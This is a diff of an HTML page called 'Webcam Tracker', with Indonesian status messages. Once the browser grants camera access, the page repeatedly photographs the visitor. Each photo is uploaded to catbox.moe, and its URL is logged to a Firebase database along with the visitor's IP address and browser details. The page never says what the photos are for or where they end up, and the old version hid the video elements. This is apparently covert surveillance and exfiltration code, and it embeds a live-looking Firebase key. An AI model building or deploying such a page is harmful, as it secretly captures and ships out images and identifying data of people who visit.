@@ -6,28 +6,16 @@
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
   <style>
-    video, canvas { display: none; }
-    body { 
-      background: #000; 
-      color: #0f0; 
-      font-family: monospace;
-      text-align: center;
-      padding: 2em;
-    }
-    .status {
-      margin: 20px 0;
-      padding: 10px;
-      border: 1px solid #0f0;
-      border-radius: 5px;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+    #status { margin: 20px; padding: 10px; background: #f0f0f0; border-radius: 5px; }
   </style>
 </head>
 <body>
   <h1>Webcam Tracker</h1>
-  <div class="status" id="status">Memulai...</div>
-  
+  <div id="status">Memulai...</div>
+
   <script>
-    // ✅ Konfigurasi Firebase
+    // 🔧 Config Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
       authDomain: "xr-social-53646.firebaseapp.com",
@@ -38,76 +26,68 @@
       appId: "1:55685443011:web:ef0f9de8e329d24d512176"
     };
     firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+    const db = firebase.database();
 
-    // 🔧 Setup elemen
+    // 🎯 Elements
     const video = document.createElement('video');
     const canvas = document.createElement('canvas');
     const ctx = canvas.getContext('2d');
     const statusEl = document.getElementById('status');
-    document.body.appendChild(video);
-    document.body.appendChild(canvas);
+    document.body.append(video, canvas);
 
-    // 🎛️ Konfigurasi
+    // 🛠️ Settings
     let photoCount = 0;
-    const maxPhotos = 5;
-    let visitorIP = "Unknown";
-    const visitTime = new Date().toLocaleString('id-ID');
+    const maxPhotos = 3; // Diubah jadi 3 foto untuk testing
+    let visitorIP = "unknown";
 
-    // 📤 Fungsi upload ke Catbox.moe
-    function uploadToCatbox(blob) {
-      return new Promise((resolve, reject) => {
-        const formData = new FormData();
-        formData.append('file', blob, `webcam_${Date.now()}.jpg`);
-
-        fetch('https://catbox.moe/user/api.php', {
+    // 📤 Upload Functions
+    async function uploadToCatbox(blob) {
+      const formData = new FormData();
+      formData.append('fileToUpload', blob, `webcam_${Date.now()}.jpg`);
+      
+      try {
+        const res = await fetch('https://catbox.moe/user/api.php', {
           method: 'POST',
           body: formData
-        })
-        .then(response => response.text())
-        .then(url => {
-          if(url.startsWith('http')) {
-            resolve(url);
-          } else {
-            reject(new Error('Upload gagal: ' + url));
-          }
-        })
-        .catch(err => reject(err));
-      });
-    }
-
-    // 🌐 Ambil IP pengunjung
-    statusEl.textContent = "🔍 Mendeteksi IP...";
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        visitorIP = data.ip;
-        statusEl.textContent = "✅ IP terdeteksi: " + visitorIP;
-        startCamera();
-      })
-      .catch(err => {
-        statusEl.textContent = "⚠️ Gagal deteksi IP: " + err.message;
-        startCamera();
-      });
-
-    // 📷 Akses kamera
-    function startCamera() {
-      statusEl.textContent = "📷 Mengakses kamera...";
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(stream => {
-          video.srcObject = stream;
-          video.play();
-          video.onloadedmetadata = () => {
-            statusEl.textContent = "📸 Kamera siap!";
-            capturePhotos();
-          };
-        })
-        .catch(err => {
-          statusEl.textContent = "❌ Akses kamera ditolak: " + err.message;
         });
+        const url = await res.text();
+        if (!url.startsWith('http')) throw new Error('Invalid response');
+        return url;
+      } catch (err) {
+        throw new Error(`Catbox error: ${err.message}`);
+      }
     }
 
-    // 🖼️ Ambil foto
+    // 🌐 Get IP with fallback
+    async function getIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json', { 
+          signal: AbortSignal.timeout(3000) 
+        });
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return "unknown";
+      }
+    }
+
+    // 📷 Camera Handler
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.play();
+        
+        video.onloadedmetadata = () => {
+          statusEl.textContent = "Kamera siap!";
+          capturePhotos();
+        };
+      } catch (err) {
+        statusEl.textContent = `Error kamera: ${err.message}`;
+      }
+    }
+
+    // 🖼️ Main Capture Logic
     async function capturePhotos() {
       while (photoCount < maxPhotos) {
         await new Promise(resolve => setTimeout(resolve, 3000));
@@ -117,28 +97,40 @@
         ctx.drawImage(video, 0, 0);
         
         try {
-          statusEl.textContent = `📤 Mengupload foto ${photoCount + 1}/${maxPhotos}...`;
-          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-          const imageUrl = await uploadToCatbox(blob);
+          statusEl.textContent = `Mengupload foto ${photoCount + 1}...`;
+          const blob = await new Promise(resolve => 
+            canvas.toBlob(resolve, 'image/jpeg', 0.7)
+          );
           
-          await database.ref('webcam_snapshots').push({
+          const imageUrl = await uploadToCatbox(blob);
+          await db.ref('webcam_snapshots').push({
             url: imageUrl,
-            timestamp: Date.now(),
             ip: visitorIP,
             userAgent: navigator.userAgent,
-            time: new Date().toLocaleString('id-ID')
+            time: new Date().toLocaleString('id-ID'),
+            timestamp: Date.now()
           });
           
           photoCount++;
-          statusEl.textContent = `✅ Foto ${photoCount} berhasil! URL: ${imageUrl}`;
+          statusEl.textContent = `Berhasil upload: ${photoCount}/${maxPhotos}`;
         } catch (err) {
-          statusEl.textContent = "❌ Error: " + err.message;
+          statusEl.textContent = `Upload gagal: ${err.message}`;
         }
       }
       
-      statusEl.textContent = "🎉 Selesai! 5 foto telah diambil.";
-      video.srcObject.getTracks().forEach(track => track.stop());
+      statusEl.textContent = "Selesai!";
+      video.srcObject?.getTracks().forEach(track => track.stop());
     }
+
+    // 🚀 Init Process
+    (async () => {
+      statusEl.textContent = "Mendeteksi IP...";
+      visitorIP = await getIP();
+      statusEl.textContent = visitorIP === "unknown" 
+        ? "Gagal deteksi IP, lanjut tanpa IP" 
+        : `IP terdeteksi: ${visitorIP}`;
+      startCamera();
+    })();
   </script>
 </body>
 </html>
